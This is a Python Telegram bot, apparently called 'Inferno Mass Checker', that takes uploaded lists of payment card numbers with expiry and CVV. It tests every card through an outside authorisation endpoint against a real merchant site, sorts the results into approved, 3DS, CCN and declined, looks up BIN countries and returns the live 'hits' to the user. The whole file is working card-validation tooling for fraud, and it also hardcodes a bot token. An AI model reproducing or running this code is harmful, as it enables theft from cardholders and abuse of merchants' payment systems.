#!/usr/bin/env python3
import telebot, requests, json, os, time

BOT_TOKEN = "7684173741:AAHtxiexCShKQbPEp1t-1EjV-UYGbxzh5e4"
ADMIN_ID = 706483179

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")

# ==========================
# AUTH SYSTEM
# ==========================
ALLOWED_FILE = "allowed_users.txt"
if not os.path.exists(ALLOWED_FILE):
    open(ALLOWED_FILE, "w").close()

def get_allowed_users():
    with open(ALLOWED_FILE) as f:
        return [line.strip() for line in f if line.strip()]

def add_user(uid):
    with open(ALLOWED_FILE, "a") as f:
        f.write(f"{uid}\n")

def remove_user(uid):
    users = get_allowed_users()
    with open(ALLOWED_FILE, "w") as f:
        for u in users:
            if str(u) != str(uid):
                f.write(u + "\n")

# ==========================
# BIN LOOKUP
# ==========================
def bin_lookup(bin_num):
    try:
        r = requests.get(f"https://bins.antipublic.cc/bins/{bin_num}", timeout=10)
        if r.status_code == 200:
            d = r.json()
            return d.get("country_name", "Unknown")
        return "Unknown"
    except:
        return "Unknown"

# ==========================
# STRIPE API (20s timeout)
# ==========================
def check_card(site, card):
    try:
        url = f"https://infernoauthitter.vercel.app/process?key=inferno&site={site}&cc={card}"
        r = requests.get(url, timeout=20)
        return r.json()
    except:
        return {"Response": "Timeout ⚠️", "Status": "Failed"}

# ==========================
# START / HELP
# ==========================
@bot.message_handler(commands=['start', 'help'])
def start(msg):
    text = (
        "```\n ✦ Inferno Mass Checker ✦\n```\n"
        "Upload a .txt file directly to start auto-check.\n"
        "/txt - Manual check mode\n"
        "▬▬▬▬▬▬▬▬▬▬▬▬▬\n"
        "/addusr <id> - Add user\n"
        "/rmusr <id> - Remove user\n\n"
        "```\n Dev: @Taisirshaik1\n```"
    )
    bot.reply_to(msg, text)

# ==========================
# MANUAL /txt MODE
# ==========================
@bot.message_handler(commands=['txt'])
def txt_manual(msg):
    uid = str(msg.from_user.id)

    if uid not in get_allowed_users() and msg.from_user.id != ADMIN_ID:
        return bot.reply_to(msg, "```\n You are not authorized ❌\n```")

    bot.reply_to(msg, "```\nSend your .txt file now.\n```")

# ==========================
# AUTO-DETECT TXT FILE
# ==========================
@bot.message_handler(content_types=['document'])
def auto_process(file_msg):

    if not file_msg.document.file_name.endswith(".txt"):
        return bot.reply_to(file_msg, "```\nPlease upload .txt file only.\n```")

    uid = str(file_msg.from_user.id)

    if uid not in get_allowed_users() and file_msg.from_user.id != ADMIN_ID:
        return bot.reply_to(file_msg, "```\nYou are not authorized.\n```")

    file_info = bot.get_file(file_msg.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    cards = downloaded.decode('utf-8').splitlines()

    site = "https://madbarn.ca"

    total = len(cards)
    approved, declined, ccn, threed = 0, 0, 0, 0

    save_hits = []

    start_msg = (
        "```\n 🔥 Mass Checking Started\n```\n"
        f"Total Cards: {total}\n"
        "Status:  Processing\n"
    )
    bot.send_message(file_msg.chat.id, start_msg)

    for cc in cards:

        cc = cc.strip()
        if "|" not in cc:
            continue

        res = check_card(site, cc)
        resp = res.get("Response", "").lower()

        # Declined
        if any(x in resp for x in ["declined", "zip", "expired"]):
            declined += 1

        # CCN (incorrect code)
        elif any(x in resp for x in ["incorrect_cvc", "cvc", "security code"]):
            ccn += 1

        # 3D secure
        elif any(x in resp for x in ["3d", "3ds", "auth", "otp"]):
            threed += 1
            country = bin_lookup(cc[:6])

            approved_msg = (
                "```\n 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗙𝗼𝘂𝗻𝗱 ✅\n```\n"
                f"*[⌯]Card*: {cc}\n"
                f"*[⌯]Response*: 3Ds Required\n"
                f"*[⌯]Info*: {country}\n"
            )
            bot.send_message(file_msg.from_user.id, approved_msg)
            save_hits.append(f"{cc}  [××]  3Ds Required")

        # Approved
        elif any(x in resp for x in ["approved", "added", "success", "card added"]):
            approved += 1
            country = bin_lookup(cc[:6])

            approved_msg = (
                "```\n 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗙𝗼𝘂𝗻𝗱 ✅\n```\n"
                f"*[⌯] Card*: {cc}\n"
                f"*[⌯] Response*: Card Added\n"
                f"*[⌯] Info*: {country}\n"
            )
            bot.send_message(file_msg.from_user.id, approved_msg)
            save_hits.append(f"{cc}  [××]  Approved")

        else:
            declined += 1

    # ==========================
    # FINAL LOG UPDATE
    # ==========================
    log_text = (
        "```\n ⚡ 𝑳𝒊𝒗𝒆 𝑳𝒐𝒈𝒔 𝑼𝒑𝒅𝒂𝒕𝒆 \n```\n"
        f"Total: {total}\n"
        f"Approved: {approved}\n"
        f"3D: {threed}\n"
        f"Declined: {declined}\n"
        f"CCN: {ccn}"
    )
    bot.send_message(file_msg.chat.id, log_text)

    # ==========================
    # FINAL SUMMARY
    # ==========================
    final_text = (
        "```\n ✓ 𝑴𝒂𝒔𝒔 𝑪𝒉𝒆𝒄𝒌 𝑪𝒐𝒎𝒑𝒍𝒆𝒕𝒆𝒅 \n```\n"
        f"*[⌯] Total*: {total}\n"
        f"*[⌯] Approved*: {approved}\n"
        f"*[⌯] 3D*: {threed}\n"
        f"*[⌯] Declined*: {declined}\n"
        f"*[⌯] CCN*: {ccn}\n"
    )
    bot.send_message(file_msg.chat.id, final_text)

    # ==========================
    # SEND .TXT WITH APPROVED + 3D
    # ==========================
    if save_hits:
        filename = f"approved_{file_msg.from_user.id}.txt"
        with open(filename, "w") as f:
            for line in save_hits:
                f.write(line + "\n")

        with open(filename, "rb") as f:
            bot.send_document(file_msg.from_user.id, f, caption="🔥 Approved & 3D Results")

        os.remove(filename)

# ==========================
# AUTO-RESTART POLLING (FIXED)
# ==========================
def run_bot():
    while True:
        try:
            bot.polling(
                non_stop=True,
                timeout=20,
                long_polling_timeout=20
            )
        except KeyboardInterrupt:
            print("\n🛑 Bot stopped by user (Ctrl + C).")
            break
        except Exception as e:
            print(f"⚠️ Error: {e}")
            print("🔁 Restarting bot in 3 seconds…")
            time.sleep(3)
            continue

print("🔥 Bot Started")
run_bot()